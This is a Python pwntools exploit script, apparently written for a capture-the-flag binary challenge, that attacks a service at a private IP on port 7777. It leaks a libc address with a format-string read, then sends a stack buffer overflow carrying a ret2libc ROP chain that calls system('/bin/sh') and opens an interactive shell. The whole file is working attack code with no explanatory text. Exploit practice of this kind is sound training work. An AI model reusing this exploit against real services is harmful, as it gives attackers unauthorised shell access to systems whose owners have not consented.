#!/usr/bin/python3
from pwn import *
import os

# context.log_level = 'DEBUG'
context.terminal = ["tmux", "splitw", "-h", "-F" "#{1102141}", "-P"]
# context.terminal = ["tmux", "split-window", "-h"]

# context.terminal = ["tilix", "--action=session-add-right", "-e"]
# context.terminal = ["tilix", "-e", "sh", "-c"]

# context.terminal = ["tmux", "splith", "-h"]

context.binary = binary = "./main"
# set context to open terminal in split mode


vuln_elf = ELF(binary)
vuln_rop = ROP(vuln_elf)
libc = ELF("./libc.so.6.docker")
vuln_libc = ROP(libc)

gs = """
b 85
continue

"""


def start():
    if args.GDB:
        return gdb.debug(vuln_elf.path, gdbscript=gs, aslr=True)
    else:
        if os.path.exists("./libc.so.6"):
            return process([vuln_elf.path], env={"LD_PRELOAD": "./libc.so.6"})
        return process(vuln_elf.path)


# gcc main.c -o main -fno-stack-protector -ld ./libc.so.6.docker

#p = start()
p = remote("10.21.235.85", 7777)
# print(p.recvuntil(b"option: "))
p.sendafter(b"option: ", b"a\n")
p.sendafter(b"number: ", b"%15$p\n")
p.recvuntil(b"entered: ")
start_call_main_128 = int(p.recvline().strip(), 16)

log.info(f"{hex(start_call_main_128)=}")

# adjust libc base address
libc.address = start_call_main_128 - 0x24083

vuln_libc.address = libc.address


log.info(f"{hex(libc.address)=}")
log.info(f"{hex(libc.sym['system'])=}")
log.info(f"{hex(libc.search(b'/bin/sh').__next__())=}")


p.sendafter(b"option: ", b"b\n")

payload = b"A" * 17 * 8


# print(vuln_rop.gadgets)
payload += p64(libc.address + vuln_libc.find_gadget(["pop rdi", "ret"]).address)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.address + vuln_libc.find_gadget(["ret"]).address)
payload += p64(libc.sym["system"])
payload += p64(libc.sym.exit)


p.sendafter(b"address: ", payload + b"\n")
p.interactive()
